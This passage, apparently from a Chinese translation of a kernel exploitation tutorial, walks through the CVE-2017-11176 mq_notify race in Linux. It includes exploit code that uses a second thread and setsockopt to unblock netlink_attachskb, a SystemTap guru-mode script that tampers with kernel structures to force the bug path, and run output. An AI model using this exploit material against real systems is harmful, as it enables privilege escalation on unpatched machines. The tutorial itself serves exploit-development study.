@@ -1,0 +1,197 @@
+              err =
+                  sock_setsockopt(sock, level, optname, optval,
+                      optlen);
+            else
+              err =
+    [4]           sock->ops->setsockopt(sock, level, optname, optval,
+                      optlen);
+        out_put:
+            fput_light(sock->file, fput_needed);
+          }
+          return err;
+        }
+setsockopt系统调用中需要满足如下条件：
+  * [0] - **optlen** 不为负
+  * [1] - **fd** 是一个有效的套接字
+  * [2] - LSM **必须** 允许我们为此套接字调用setsockopt()
+  * [3] - **level** 不等于SOL_SOCKET
+如果我们满足这些条件，它将调用netlink_setsockopt()[4]：
+    // [net/netlink/af_netlink.c]
+        static int netlink_setsockopt(struct socket *sock, int level, int optname,
+                    char __user *optval, unsigned int optlen)
+        {
+          struct sock *sk = sock->sk;
+          struct netlink_sock *nlk = nlk_sk(sk);
+          unsigned int val = 0;
+          int err;
+    [5]   if (level != SOL_NETLINK)
+            return -ENOPROTOOPT;
+    [6]   if (optlen >= sizeof(int) && get_user(val, (unsigned int __user *)optval))
+            return -EFAULT;
+          switch (optname) {
+            // ... cut (other options) ...
+    [7]   case NETLINK_NO_ENOBUFS:
+    [8]     if (val) {
+              nlk->flags |= NETLINK_RECV_NO_ENOBUFS;
+              clear_bit(0, &nlk->state);
+    [9]       wake_up_interruptible(&nlk->wait);
+            } else
+              nlk->flags &= ~NETLINK_RECV_NO_ENOBUFS;
+            err = 0;
+            break;
+          default:
+            err = -ENOPROTOOPT;
+          }
+          return err;
+        }
+有一些额外的条件需要满足：
+  * [5] - **level** 必须等于SOL_NETLINK
+  * [6] - **optlen** 必须大于或等于sizeof(int)， **optval** 应指向可读内存地址。
+  * [7] - **optname** 必须等于NETLINK_NO_ENOBUFS
+  * [8] - **val** 不为0
+如果我们满足所有条件，将会调用wake_up_interruptible()来唤醒被阻塞的线程[9]。最后，以下代码片段完成此工作：
+    int sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); // same socket used by blocking thread
+    int val = 3535; // different than zero
+    _setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val));
+## 更新exp
+我们了解了如何通过setsockopt()调用wake_up_interruptible()。但是有一个问题：如何在阻塞的情况下调用函数？
+**答案是：使用多线程！**
+创建另一个线程（ **unblock_thread** ），并更新exp（编译时带有“-pthread”选项）：
+    struct unblock_thread_arg
+        {
+          int fd;
+          bool is_ready;  // we could use pthread's barrier here instead
+        };
+        static void* unblock_thread(void *arg)
+        {
+          struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
+          int val = 3535; // need to be different than zero
+          // notify the main thread that the unblock thread has been created
+          uta->is_ready = true; 
+          // WARNING: the main thread *must* directly call mq_notify() once notified!
+          sleep(5); // gives some time for the main thread to block
+          printf("[unblock] unblocking now\n");
+          if (_setsockopt(uta->fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
+            perror("setsockopt");
+          return NULL;
+        }
+        int main(void)
+        {
+          struct sigevent sigev;
+          char sival_buffer[NOTIFY_COOKIE_LEN];
+          int sock_fd;
+          pthread_t tid;
+          struct unblock_thread_arg uta;
+          // ... cut ...
+          // initialize the unblock thread arguments, and launch it
+          memset(&uta, 0, sizeof(uta));
+          uta.fd = sock_fd;
+          uta.is_ready = false;
+          printf("creating unblock thread...\n");
+          if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
+          {
+            perror("pthread_create");
+            goto fail;
+          }
+          while (uta.is_ready == false) // spinlock until thread is created
+            ;
+          printf("unblocking thread has been created!\n");
+          printf("get ready to block\n");
+          if (_mq_notify((mqd_t)-1, &sigev))
+          {
+            perror("mq_notify");
+            goto fail;
+          }
+          printf("mq_notify succeed\n");
+          // ... cut ...
+        }
+调用 **pthread_create()**
+创建线程（会产生新的task_struct）并启动。但这并不意味着新线程会立即运行。为了确保新线程已经开始运行，我们使用了一个 **自旋锁**
+：uta->is_ready。
+**NOTE** ：自旋锁是最简单的锁。基本上一直循环直到变量改变。这里不用原子操作的原因是只有一个写者和一个读者。
+主线程陷入循环，直到unblock_thread线程解锁（将"is_ready"设置为true）。使用pthread的屏障可以实现同样的目的（但并不总是可用）。这里的自旋锁是可选的，它只是对线程创建提供了“更多控制”，并且创建新线程可能意味着大量内存分配，这通常会有一些副作用。
+假设在pthread_create()之后，主线程被抢占了一段“很长”的时间（即没有在执行）。可能有以下顺序：
+Thread-1 | Thread-2  
+---|---  
+|  
+pthread_create() |  
+| >>  
+>> |  
+| >>  
+>> | setsockopt() -> succeed  
+|  
+mq_notify() |  
+=> start BLOCKING  
+在这种情况下，会在mq_notify阻塞之前就调用了“setsockopt()”。这样子并不会解除主线程的阻塞。所以在解锁主线程（设置"is_ready"为真）后需要
+**sleep(5)** 。主线程至少有5秒的时间来调用mq_notify()。可以放心地假设“5秒”是足够的，因为：
+  * 如果主线程在5秒后仍然被抢占，则目标系统负载很重，那么就不应该运行exp。
+  * 如果unblock_thread线程“竞争”主线程（在mq_notify()之前就调用了setsockopt()）那么我们总是可以通过CTRL+C退出。这样做会使netlink_attachskb()返回“-ERESTARTSYS”。该路径没有触发漏洞。我们可以重新运行exp。
+## 更新STAP脚本
+在运行新exp之前，我们需要编辑STAP脚本。当前的STAP脚本在调用netlink_attachskb()之前就删除了netlink套接字（fd=3）。这意味着如果我们在netlink_attachskb()中阻塞之后调用setsockopt()，文件描述符sock_fd是无效的（它在FDT中值为NULL）。setsockopt()将失败并返回“Bad
+File Descriptor”错误（并不会执行到netlink_setsockopt()）。
+修改STAP脚本，在netlink_attachskb()返回时才删除FDT中的fd“3”：
+    # mq_notify_force_crash.stp
+    #
+    # Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)
+    %{
+    #include 
+    #include 
+    #include 
+    %}
+    function force_trigger_before:long (arg_sock:long)
+    %{
+      struct sock *sk = (void*) STAP_ARG_arg_sock;
+      struct netlink_sock *nlk = (void*) sk;
+      nlk->state |= 1;   // enter the netlink_attachskb() retry path    
+      // NOTE: We do not mark the sock as DEAD anymore
+    %}
+    function force_trigger_after:long (arg_sock:long)
+    %{
+      struct files_struct *files = current->files;
+      struct fdtable *fdt = files_fdtable(files);
+      fdt->fd[3] = NULL; // makes the second call to fget() fails
+    %}
+    probe kernel.function ("netlink_attachskb")
+    {
+      if (execname() == "exploit")
+      {
+        force_trigger_before($sk);
+      }
+    }
+    probe kernel.function ("netlink_attachskb").return
+    {
+      if (execname() == "exploit")
+      {
+        force_trigger_after(0);
+      }
+    }
+与之前一样，添加更多探针，以便看到代码流程。有以下输出：
+    $ ./exploit 
+    -={ CVE-2017-11176 Exploit }=-    netlink socket created = 3
+    creating unblock thread...
+    unblocking thread has been created!
+    get ready to block
+    >>
+    [unblock] unblocking now
+    mq_notify: Bad file descriptor
+    exploit failed!
+    (15981-15981) [SYSCALL] ==>> mq_notify (-1, 0x7fffbd130e30)
+    (15981-15981) [uland] ==>> copy_from_user ()
+    (15981-15981) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
+    (15981-15981) [uland] ==>> copy_from_user ()
+    (15981-15981) [skb] ==>> skb_put (skb=0xffff8800302551c0 len=0x20)
+    (15981-15981) [skb] > fget (fd=0x3)
+    (15981-15981) [vfs] > netlink_getsockbyfilp (filp=0xffff8800314869c0)
+    (15981-15981) [netlink] > netlink_attachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0 timeo=0xffff88000b157f40 ssk=0x0)
+    (15981-15981) [sched] ==>> schedule_timeout (timeout=0x7fffffffffffffff)
+    (15981-15981) [sched] ==>> schedule ()
+    (15981-15981) [sched] ==>> deactivate_task (rq=0xffff880003c1f3c0 p=0xffff880031512200 flags=0x1)
+    (15981-15981) [sched] >>
+    (15981-15981) [sched] > fget (fd=0x3)
+    (15981-15981) [vfs] > netlink_detachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0)
+    (15981-15981) [netlink] <<== netlink_detachskb
+    (15981-15981) [SYSCALL] <<== mq_notify= -9
+**NOTE** ：为简单起见，已删除其他线程的输出。
+主线程在netlink_attachskb()中阻塞了5秒，通过其他线程解除主线程阻塞并且netlink_attachskb()返回1！
+在本节中，我们了解了如何延长竞态窗口期（延长至5秒），如何通过setsockopt()唤醒主线程。还介绍了可能在exp中发生的“竞争”，以及如何通过简单的技巧降低其发生概率。在POC中满足了触发漏洞的一个条件，还有两个条件需要满足。
+译者注：[下一部分链接](https://xz.aliyun.com/t/5369)
